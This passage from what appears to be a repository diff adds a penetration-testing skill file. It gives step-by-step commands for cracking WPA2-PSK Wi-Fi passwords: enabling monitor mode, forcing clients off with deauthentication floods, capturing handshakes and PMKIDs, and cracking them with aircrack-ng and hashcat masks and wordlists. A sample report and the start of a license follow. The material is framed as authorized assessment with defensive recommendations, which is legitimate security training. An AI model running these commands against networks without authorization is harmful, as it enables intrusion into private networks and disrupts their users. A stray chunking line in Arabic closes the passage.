+- Kali Linux with aircrack-ng suite, hashcat, and hcxtools installed
+- Password wordlists (rockyou.txt, SecLists, or custom organization-specific lists)
+- GPU-capable system for hashcat acceleration (optional but recommended for large wordlists)
+
+## Workflow
+
+### Step 1: Prepare the Wireless Interface
+
+```bash
+# Identify wireless interfaces
+iwconfig
+# or
+iw dev
+
+# Kill interfering processes
+sudo airmon-ng check kill
+
+# Enable monitor mode
+sudo airmon-ng start wlan0
+# Output: monitor mode enabled on wlan0mon
+
+# Verify monitor mode
+iwconfig wlan0mon
+# Mode should show "Monitor"
+
+# Alternatively, enable monitor mode manually
+sudo ip link set wlan0 down
+sudo iw dev wlan0 set type monitor
+sudo ip link set wlan0 up
+```
+
+### Step 2: Scan for Target Networks
+
+```bash
+# Scan all channels for access points
+sudo airodump-ng wlan0mon
+
+# Output columns:
+# BSSID          PWR  Beacons  #Data  CH  ENC   CIPHER  AUTH  ESSID
+# AA:BB:CC:DD:EE:FF  -45    120    35   6  WPA2  CCMP    PSK   TargetNetwork
+
+# Identify the target network parameters:
+# - BSSID (MAC address of the access point)
+# - Channel number
+# - Encryption type (WPA2-PSK is the target)
+# - Connected clients (in the lower section)
+
+# Focus scanning on the target channel
+sudo airodump-ng wlan0mon --channel 6 --bssid AA:BB:CC:DD:EE:FF -w capture
+```
+
+### Step 3: Capture the WPA2 4-Way Handshake
+
+```bash
+# Method 1: Wait for a client to connect naturally
+# Keep airodump-ng running and wait for "WPA handshake: AA:BB:CC:DD:EE:FF" message
+sudo airodump-ng wlan0mon --channel 6 --bssid AA:BB:CC:DD:EE:FF -w handshake_capture
+
+# Method 2: Deauthenticate a client to force reconnection (active)
+# In a separate terminal, send deauth packets to a specific client
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+
+# Or deauth all clients (broadcast)
+sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Method 3: Capture PMKID from the AP (no client needed)
+# Using hcxdumptool
+sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid_capture.pcapng \
+  --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2
+
+# Wait for "PMKID" message, then convert for hashcat
+hcxpcapngtool -o pmkid_hash.hc22000 pmkid_capture.pcapng
+
+# Verify handshake was captured
+aircrack-ng handshake_capture-01.cap
+# Should show: "1 handshake" next to the target BSSID
+
+# Alternative verification with cowpatty
+cowpatty -r handshake_capture-01.cap -c
+```
+
+### Step 4: Crack with Aircrack-ng (CPU-based)
+
+```bash
+# Crack using rockyou wordlist
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake_capture-01.cap
+
+# Use multiple wordlists
+aircrack-ng -w /usr/share/wordlists/rockyou.txt,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt \
+  -b AA:BB:CC:DD:EE:FF handshake_capture-01.cap
+
+# Crack with a specific ESSID
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -e "TargetNetwork" handshake_capture-01.cap
+
+# If successful, output shows:
+# KEY FOUND! [ password123 ]
+```
+
+### Step 5: Crack with Hashcat (GPU-accelerated)
+
+```bash
+# Convert capture to hashcat format
+# For handshake captures:
+hcxpcapngtool -o hashcat_input.hc22000 handshake_capture-01.cap
+
+# Or use aircrack-ng conversion
+aircrack-ng handshake_capture-01.cap -j hashcat_input
+
+# Dictionary attack with hashcat
+hashcat -m 22000 hashcat_input.hc22000 /usr/share/wordlists/rockyou.txt
+
+# Rule-based attack (transforms dictionary words)
+hashcat -m 22000 hashcat_input.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Brute force 8-character numeric passwords
+hashcat -m 22000 hashcat_input.hc22000 -a 3 ?d?d?d?d?d?d?d?d
+
+# Combination attack (two wordlists combined)
+hashcat -m 22000 hashcat_input.hc22000 -a 1 wordlist1.txt wordlist2.txt
+
+# Mask attack for common patterns (Word + 4 digits)
+hashcat -m 22000 hashcat_input.hc22000 -a 3 -1 ?l?u ?1?1?1?1?1?d?d?d?d
+
+# For PMKID-specific hashes
+hashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt
+
+# Show cracked password
+hashcat -m 22000 hashcat_input.hc22000 --show
+```
+
+### Step 6: Document and Clean Up
+
+```bash
+# Stop monitor mode
+sudo airmon-ng stop wlan0mon
+
+# Restart networking services
+sudo systemctl restart NetworkManager
+
+# Generate report
+cat > wifi_assessment_report.txt << 'EOF'
+WiFi Security Assessment Results
+=================================
+Target SSID: TargetNetwork
+BSSID: AA:BB:CC:DD:EE:FF
+Encryption: WPA2-PSK (CCMP)
+Channel: 6
+
+Handshake Capture: Successful (Method: Client deauthentication)
+Cracking Result: PASSWORD FOUND
+Password: [documented securely]
+Time to Crack: 3 minutes 47 seconds (rockyou.txt, hashcat GPU)
+
+Recommendation: Change to a passphrase of 15+ characters with mixed case,
+numbers, and symbols, or migrate to WPA2/WPA3-Enterprise with 802.1X.
+EOF
+
+# Securely handle capture files (contain sensitive authentication material)
+sha256sum handshake_capture-01.cap > evidence_hashes.txt
+# Transfer to secure evidence storage per engagement agreement
+```
+
+## Key Concepts
+
+| Term | Definition |
+|------|------------|
+| **4-Way Handshake** | WPA/WPA2 authentication exchange between client and AP that derives session keys from the PSK, captured for offline password cracking |
+| **PMKID** | Pairwise Master Key Identifier included in the first EAPOL frame from the AP, allowing password cracking without capturing the full handshake or requiring a connected client |
+| **Monitor Mode** | Wireless interface mode that captures all wireless frames on a channel without associating with any access point |
+| **Deauthentication Attack** | Sending forged 802.11 management frames to disconnect a client from the AP, forcing a reconnection that generates a capturable handshake |
+| **PSK (Pre-Shared Key)** | Static password used by all users to authenticate to a WPA/WPA2-Personal network, vulnerable to offline dictionary attacks |
+| **802.1X/EAP** | Enterprise wireless authentication using RADIUS that provides per-user credentials, eliminating the shared password vulnerability |
+
+## Tools & Systems
+
+- **aircrack-ng suite**: Comprehensive wireless security toolkit including airodump-ng (capture), aireplay-ng (injection), and aircrack-ng (cracking)
+- **hashcat**: GPU-accelerated password cracker supporting WPA/WPA2 handshakes (mode 22000) with dictionary, rule, and mask attacks
+- **hcxtools**: Tools for capturing PMKID and converting wireless captures to hashcat-compatible formats
+- **hcxdumptool**: Capture tool specifically designed for PMKID extraction without requiring client deauthentication
+- **cowpatty**: WPA/WPA2 cracking tool with precomputed hash table support for faster dictionary attacks
+
+## Common Scenarios
+
+### Scenario: Wireless Penetration Test for a Corporate Office
+
+**Context**: A financial services company wants to assess the security of their wireless networks. They have three SSIDs: Corp-WiFi (WPA2-Enterprise for employees), Guest-WiFi (WPA2-PSK for visitors), and IoT-WiFi (WPA2-PSK for IoT devices). The assessment is authorized to test all three networks.
+
+**Approach**:
+1. Scan for all three SSIDs and identify their BSSIDs, channels, and encryption types
+2. Verify that Corp-WiFi uses 802.1X/EAP by examining beacon frames -- confirmed, no PSK to crack
+3. Capture the 4-way handshake for Guest-WiFi by deauthenticating a connected device and capturing the reconnection
+4. Run hashcat with rockyou.txt against the Guest-WiFi handshake -- password "Welcome2024!" cracked in 47 seconds
+5. Capture PMKID from IoT-WiFi access point (no client deauth needed) and crack with hashcat -- password "iot12345" found in 12 seconds
+6. Demonstrate that Guest-WiFi and IoT-WiFi passwords are weak and easily crackable
+7. Recommend migrating Guest-WiFi to a captive portal with per-session passwords and strengthening IoT-WiFi to a 20+ character passphrase
+
+**Pitfalls**:
+- Sending excessive deauth frames that disrupt legitimate wireless users beyond the test scope
+- Not using a wireless adapter that supports the target network's frequency band (2.4 GHz vs 5 GHz)
+- Attempting to crack WPA3-SAE networks with traditional handshake capture (SAE is resistant to offline attacks)
+- Running GPU cracking on shared systems without monitoring temperature and power consumption
+
+## Output Format
+
+```
+## Wireless Security Assessment Report
+
+**Assessment Date**: 2024-03-15
+**Location**: Corporate Office, Building A
+
+### Network Inventory
+
+| SSID | BSSID | Encryption | Auth | Channel | Crackable |
+|------|-------|------------|------|---------|-----------|
+| Corp-WiFi | AA:BB:CC:11:22:33 | WPA2 | 802.1X | 36 | N/A (Enterprise) |
+| Guest-WiFi | AA:BB:CC:44:55:66 | WPA2 | PSK | 6 | YES - 47 seconds |
+| IoT-WiFi | AA:BB:CC:77:88:99 | WPA2 | PSK | 1 | YES - 12 seconds |
+
+### Findings
+
+**Finding 1: Weak Guest-WiFi Password (High)**
+- Password: "Welcome2024!" (cracked via dictionary in 47 seconds)
+- Present in rockyou.txt top 100,000 entries
+- Shared among all visitors with no rotation policy
+
+**Finding 2: Trivial IoT-WiFi Password (Critical)**
+- Password: "iot12345" (cracked in 12 seconds)
+- Default-pattern password providing access to IoT device network
+- No network segmentation between IoT-WiFi and corporate resources
+
+### Recommendations
+1. Migrate Guest-WiFi to captive portal with per-session credentials
+2. Change IoT-WiFi to 20+ character random passphrase with quarterly rotation
+3. Implement network segmentation isolating IoT VLAN from corporate resources
+4. Consider WPA3-SAE for PSK networks to prevent offline cracking
+5. Enable 802.11w Protected Management Frames to prevent deauth attacks
+```
+
+##### END FILE #####
+
+##### FILE: performing-wifi-password-cracking-with-aircrack/LICENSE #####
+
+                                 Apache License
+                           Version 2.0, January 2004
+                        http://www.apache.org/licenses/
+
+   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+   1. Definitions.
+
+      "License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+
+      "Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+
+      "You" (or "Your") shall mean an individual or Legal Entity
+      exercising permissions granted by this License.
+
+      "Source" form shall mean the preferred form for making modifications,
+      including but not limited to software source code, documentation
+      source, and configuration files.
+
+      "Object" form shall mean any form resulting from mechanical
+      transformation or translation of a Source form, including but
+      not limited to compiled object code, generated documentation,
+      and conversions to other media types.
+
+      "Work" shall mean the work of authorship, whether in Source or
+      Object form, made available under the License, as indicated by a
+      copyright notice that is included in or attached to the work
+      (an example is provided in the Appendix below).
+
+      "Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+
+      "Contribution" shall mean any work of authorship, including
+      the original version of the Work and any modifications or additions
+      to that Work or Derivative Works thereof, that is intentionally
+      submitted to the Licensor for inclusion in the Work by the copyright owner
+      or by an individual or Legal Entity authorized to submit on behalf of
+      the copyright owner. For the purposes of this definition, "submitted"
+      means any form of electronic, verbal, or written communication sent
+      to the Licensor or its representatives, including but not limited to
+      communication on electronic mailing lists, source code control systems,
+      and issue tracking systems that are managed by, or on behalf of, the
+      Licensor for the purpose of discussing and improving the Work, but
+      excluding communication that is conspicuously marked or otherwise
+      designated in writing by the copyright owner as "Not a Contribution."
+
+      "Contributor" shall mean Licensor and any individual or Legal Entity
+      on behalf of whom a Contribution has been received by the Licensor and
+      subsequently incorporated within the Work.
+
+   2. Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+
+   3. Grant of Patent License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      (except as stated in this section) patent license to make, have made,
+      use, offer to sell, sell, import, and otherwise transfer the Work,
+      where such license applies only to those patent claims licensable
+      by such Contributor that are necessarily infringed by their
+      Contribution(s) alone or by combination of their Contribution(s)
+      with the Work to which such Contribution(s) was submitted. If You
+      institute patent litigation against any entity (including a
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      or a Contribution incorporated within the Work constitutes direct
+      or contributory patent infringement, then any patent licenses
+      granted to You under this License for that Work shall terminate
+      as of the date such litigation is filed.
+
+   4. Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+
+-----
+[END PART 12/14] — رد غير "Received part 12/14"
